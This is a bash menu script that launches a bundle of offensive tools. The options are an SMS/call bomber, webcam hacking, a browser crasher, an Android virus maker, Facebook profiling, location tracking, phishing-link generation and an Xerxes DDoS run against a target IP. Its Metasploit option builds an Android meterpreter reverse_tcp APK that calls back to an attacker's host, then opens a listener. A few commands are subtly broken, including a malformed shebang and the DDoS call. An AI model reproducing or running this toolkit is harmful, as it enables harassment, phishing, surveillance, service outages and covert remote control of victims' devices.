# /bin/bash

clear
red='\033[1;31m'
lpr='\033[1;35m'
yelw='\033[1;33m'
null='\033[0m'
gr='\033[0;32m'
echo "*********************************************************************" | lolcat
echo "       [\:\> HACKING AND PENTESTING WITH VAMPIER VERMA </:/]" | lolcat --animate
echo "*********************************************************************" | lolcat
toilet -f mono12 "T-VERMA" | lolcat
echo "*********************************************************************" | lolcat
echo "      #_> THIS TOOL IS MADE BY VAMPIER >> [> SANDEEP VERMA <]" | lolcat --animate
echo "*********************************************************************" | lolcat
echo
echo
printf "          ${red} [+] Enter the Tool number to Run [+] ${null}\n" 
echo
printf "${red}(01)${null} ${gr}TBomb-V-2.0${null} ( Start Call & Sms Spam // Making the network busy )\n"
printf "${red}(02)${null} ${gr}H-Cam${null}       ( Webcam Hacking )\n"
printf "${red}(03)${null} ${gr}VAMPIRZ${null}     ( Crashing victim's Browser )\n"
printf "${red}(04)${null} ${gr}SQLMAP${null}      ( Database Vuln. Testing )\n"
printf "${red}(05)${null} ${gr}Metasploit${null}  ( Exploiting )\n"
printf "${red}(06)${null} ${gr}Amer${null}        ( Making Virus for Android )\n"
printf "${red}(07)${null} ${gr}FBI${null}         ( Facebook Information Gathering )\n"
printf "${red}(08)${null} ${gr}Seeker-2${null}    ( Track Exact Location )\n"
printf "${red}(09)${null} ${gr}HiddenEye${null}   ( Generate Phishing Links )\n"
printf "${red}(10)${null} ${gr}Xerxes${null}      ( DDos Attack to Down any web server )\n"
echo
echo
printf "${yelw}[+] Enter the number [+]:> ${null}"
read ch 
if [[ $ch == 1 ]]; then

printf "${red}Running${null}${yelw} TBomb-V-2.0 ...${null} \n"
cd tools/TBomb-V-2.0
chmod +x *
pip install -r requirements.txt
bash TBomb.sh

fi 

if [[ $ch == 2 ]]; then
printf "${red}Running${null}${yelw} H-Cam ...${null} \n"
cd tools/H-Cam
chmod +x *
clear
bash H-Cam.sh

fi

if [[ $ch == 3 ]]; then
printf "${red}Running${null}${yelw} VAMPIRZ ...${null} \n"
cd tools/VAMPIRZ
chmod +x *
clear
bash vampirz.sh

fi 

if [[ $ch == 4 ]]; then 
printf "${red}Running${null}${yelw} SQLMAP ...${null} \n"
cd tools/sqlmap
chmod +x *
clear
python sqlmap.py

fi

if [[ $ch == 5 ]]; then

printf "${red}Running${null}${yelw} Metasploit Framework ...${null} \n"
clear
figlet -f standard "MSF"
echo
printf "1). Create Payload.\n" | lolcat --animate
printf "2). Start  Listener.\n" | lolcat --animate
echo
printf "${yelw}[#]:> ${null}"
read op
echo 
if [[ $op == 1 ]]; then

printf "${yelw}[#] Enter your LHOST :> ${null}"
read host
echo
printf "${yelw}[#] Enter your LPORT :> ${null}"
read port
echo
printf "${yelw}[#] Enter payload name :> ${null}"
read name

msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o /sdcard/$name.apk

msfconsole

fi

if [[ $op == 2 ]]; then 

msfconsole
fi

fi 

if [[ $ch == 6 ]]; then
printf "${red}Running${null}${yelw} Amer ...${null} \n"
cd tools/Amer
chmod +x Amer
bash Amer.sh

fi 

if [[ $ch == 7 ]]; then
printf "${red}Running${null}${yelw} FBI ...${null} \n"
cd tools/fbi
chmod +x *
pip3 install -r requirements.txt
clear
python3 fbi.py

fi

if [[ $ch == 8 ]]; then
printf "${red}Running${null}${yelw} Seeker-2 ...${null} \n"
cd tools/seeker-2
chmod +x *
clear
bash seeker.sh

fi

if [[ $ch == 9 ]]; then
printf "${red}Running${null}${yelw} HiddenEye ...${null} \n"
cd tools/HiddenEye
chmod +x *
clear
./HiddenEye.py

fi 

if [[ $ch == 10 ]]; then
printf "${red}Running${null}${yelw} XerXes ...${null} \n"
echo
cd tools/XERXES
chmod +x *
clear
gcc -o ./xerxes xerxes.c
printf "${red}[+] Enter the IP of your Target Site [+]${null}" | lolcat --animate
echo 
echo

printf "${yelw}[#] Enter target IP :> ${null}"

read ip 
echo

printf "Starting DDos Attack ..." | lolcat --animate
echo

sleep 3

./xerxes xerxes.c $ip

fi



